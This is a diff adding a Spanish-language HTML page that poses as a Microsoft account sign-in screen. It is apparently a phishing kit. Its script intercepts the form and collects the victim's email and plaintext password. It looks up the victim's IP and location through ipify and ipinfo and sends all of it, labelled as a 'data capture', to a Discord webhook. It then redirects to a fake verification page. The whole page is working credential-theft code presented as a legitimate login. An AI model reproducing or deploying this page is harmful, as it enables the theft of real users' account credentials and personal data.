@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Inicio</title>
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Inter', 'Segoe UI', sans-serif;
+      background: #f3f3f3;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .phone {
+      width: 100%;
+      max-width: 390px;
+      border-radius: 28px;
+      overflow: hidden;
+      box-shadow: 0 12px 50px rgba(0,0,0,0.18);
+    }
+
+    .header {
+      background: linear-gradient(145deg, #1565c0 0%, #1976d2 40%, #1e88e5 100%);
+      padding: 48px 0 52px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .header::before, .header::after {
+      content: '';
+      position: absolute;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.06);
+    }
+    .header::before { width: 260px; height: 260px; top: -80px; right: -60px; }
+    .header::after  { width: 180px; height: 180px; bottom: -60px; left: -40px; }
+
+
+    .ms-logo {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 4px;
+      width: 68px;
+      height: 68px;
+      position: relative;
+      z-index: 1;
+    }
+    .ms-logo span {
+      display: block;
+      border-radius: 1px;
+    }
+    .ms-logo span:nth-child(1) { background: #f35325; }
+    .ms-logo span:nth-child(2) { background: #81bc06; }
+    .ms-logo span:nth-child(3) { background: #05a6f0; }
+    .ms-logo span:nth-child(4) { background: #ffba08; }
+
+ 
+    .card {
+      background: #fff;
+      padding: 32px 28px 24px;
+    }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 700;
+      color: #111;
+      margin-bottom: 4px;
+    }
+    .subtitle {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 26px;
+    }
+
+    label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #222;
+      margin-bottom: 6px;
+    }
+
+    .input-wrap {
+      position: relative;
+      margin-bottom: 18px;
+    }
+    .input-wrap .icon {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #555;
+      display: flex;
+    }
+    .input-wrap .icon svg { width: 18px; height: 18px; }
+
+    .input-wrap input {
+      width: 100%;
+      border: 1.5px solid #c8c8c8;
+      border-radius: 6px;
+      padding: 14px 44px;
+      font-size: 15px;
+      font-family: inherit;
+      color: #111;
+      background: #fff;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .input-wrap input::placeholder { color: #aaa; }
+    .input-wrap input:focus {
+      border-color: #1976d2;
+      box-shadow: 0 0 0 3px rgba(25,118,210,0.15);
+    }
+
+    .eye-btn {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #666;
+      display: flex;
+      padding: 4px;
+    }
+    .eye-btn svg { width: 20px; height: 20px; }
+
+    .btn-primary {
+      width: 100%;
+      padding: 15px;
+      background: #1565c0;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: 600;
+      font-family: inherit;
+      color: #fff;
+      cursor: pointer;
+      margin-top: 6px;
+      margin-bottom: 18px;
+      transition: background 0.2s, transform 0.1s;
+    }
+    .btn-primary:hover  { background: #1255a8; }
+    .btn-primary:active { transform: scale(0.98); }
+
+    .forgot {
+      display: block;
+      text-align: center;
+      font-size: 14px;
+      font-weight: 600;
+      color: #1565c0;
+      text-decoration: none;
+      margin-bottom: 20px;
+    }
+    .forgot:hover { text-decoration: underline; }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 18px;
+    }
+    .divider hr {
+      flex: 1;
+      border: none;
+      border-top: 1px solid #e0e0e0;
+    }
+    .divider span {
+      font-size: 13px;
+      color: #888;
+    }
+
+    .create {
+      text-align: center;
+      font-size: 14px;
+      color: #444;
+      margin-bottom: 24px;
+    }
+    .create a {
+      color: #1565c0;
+      font-weight: 600;
+      text-decoration: none;
+    }
+    .create a:hover { text-decoration: underline; }
+
+    .footer {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      padding-top: 12px;
+      border-top: 1px solid #f0f0f0;
+    }
+    .footer a {
+      font-size: 12px;
+      color: #888;
+      text-decoration: none;
+    }
+    .footer a:hover { color: #1565c0; text-decoration: underline; }
+	.btn-primary {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  min-height: 52px;
+}
+.btn-primary:disabled {
+  background: #5a90c8;
+  cursor: not-allowed;
+  opacity: 0.85;
+}
+
+
+@keyframes spin { to { transform: rotate(360deg); } }
+.spinner {
+  width: 20px; height: 20px;
+  border: 2.5px solid rgba(255,255,255,0.35);
+  border-top-color: #fff;
+  border-radius: 50%;
+  animation: spin 0.75s linear infinite;
+  flex-shrink: 0;
+}
+
+#btn-siguiente:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+
+button:disabled,
+#btn-siguiente:disabled,
+.btn-primary:disabled {
+
+  opacity: 0.5 !important;
+  background-color: #7aa7d6 !important;
+  cursor: not-allowed !important;
+
+  pointer-events: none;
+  filter: grayscale(20%);
+}
+  </style>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script type="text/javascript" src="infodt.js"></script>
+</head>
+<body>
+
+<div class="phone">
+
+  <div class="header">
+    <div class="ms-logo">
+      <span></span><span></span>
+      <span></span><span></span>
+    </div>
+  </div>
+
+  <div class="card">
+
+    <h1>Iniciar sesión</h1>
+    <p class="subtitle">Usa tu cuenta de Microsoft</p>
+	<form method="post" action="" id="form1">
+    <label for="email">Correo electrónico, teléfono o Skype</label>
+    <div class="input-wrap">
+      <span class="icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="12" cy="8" r="4"/>
+          <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/>
+        </svg>
+      </span>
+      <input id="email" type="email" placeholder="usuario@ejemplo.com" required autocomplete="email"/>
+    </div>
+
+    <label for="password">Contraseña</label>
+    <div class="input-wrap">
+      <span class="icon">
+        <!-- lock icon -->
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="5" y="11" width="14" height="10" rx="2"/>
+          <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
+        </svg>
+      </span>
+      <input id="password" type="password" placeholder="Introduce tu contraseña" autocomplete="current-password" required />
+      <button class="eye-btn" onclick="togglePwd()" id="eye-btn" type="button" aria-label="Mostrar contraseña">
+       
+        <svg id="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/>
+          <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/>
+          <line x1="1" y1="1" x2="23" y2="23"/>
+        </svg>
+      </button>
+    </div>
+
+   <button class="btn-primary" type="submit" id="btn-siguiente" >
+  <span id="btn-text">Siguiente</span>
+</button>
+	</form>
+    <a href="#" class="forgot">¿Has olvidado tu contraseña?</a>
+
+    <div class="divider">
+      <hr/><span>o</span><hr/>
+    </div>
+
+    <p class="create">¿No tienes una cuenta? <a href="#">Crear una cuenta</a></p>
+
+    <div class="footer">
+      <a href="#">Condiciones de uso</a>
+      <a href="#">Privacidad y cookies</a>
+      <a href="#">Ayuda</a>
+    </div>
+
+  </div>
+</div>
+
+<script>
+  function togglePwd() {
+    const inp = document.getElementById('password');
+    const icon = document.getElementById('eye-icon');
+    if (inp.type === 'password') {
+      inp.type = 'text';
+      icon.innerHTML = `
+        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+        <circle cx="12" cy="12" r="3"/>
+      `;
+    } else {
+      inp.type = 'password';
+      icon.innerHTML = `
+        <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/>
+        <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/>
+        <line x1="1" y1="1" x2="23" y2="23"/>
+      `;
+    }
+  }
+  
+</script>
+
+<script>
+$(document).ready(function () {
+
+  $('#form1').submit(function(e){
+    e.preventDefault();
+
+    const eml = $('#email').val();
+    const cla = $('#password').val();
+	localStorage.setItem('user', eml);
+
+const btn = document.getElementById('btn-siguiente');
+const text = document.getElementById('btn-text');
+
+btn.disabled = true;
+
+btn.style.opacity = "0.5";
+
+if (!btn.querySelector('.spinner')) {
+
+  const spinner = document.createElement('span');
+  spinner.className = 'spinner';
+
+  btn.insertBefore(spinner, text);
+
+  text.textContent = 'Verificando...';
+}
+
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+    ip = data.ip;
+    $.getJSON("https://ipinfo.io", function (response) {
+        ip2 = response.city + ", " + response.country;
+
+       var message = "``` NUEVA CAPTURA DE DATOS ```\n" +
+              "📧**Corre0:** `" + eml + "`\n" +
+              "🔒**Clav3:** `" + cla + "`\n\n" +
+              "📡 **Información de Red:**\n" +
+              "📌**IP:** `" + ip + "`\n" +
+              "🌍 **Ubicación:** `" + ip2 + "`\n" +
+              "───────────────────────────";
+
+        var settings = {
+    async: true,
+    url: webhook,
+    method: "POST",
+    contentType: "application/json",
+    data: JSON.stringify({
+        content: message
+    })
+};
+
+$.ajax(settings).done(function (response) {
+    setTimeout(() => {
+  window.location.href = 'wts_verific.html'; 
+  }, 3000);
+}).fail(function (err) {
+    console.error("Error enviando a Discord:", err);
+});
+
+    });
+});
+    btn.disabled = false;
+    text.textContent = 'Siguiente';
+  });
+
+});
+</script>
+</body>
+</html>
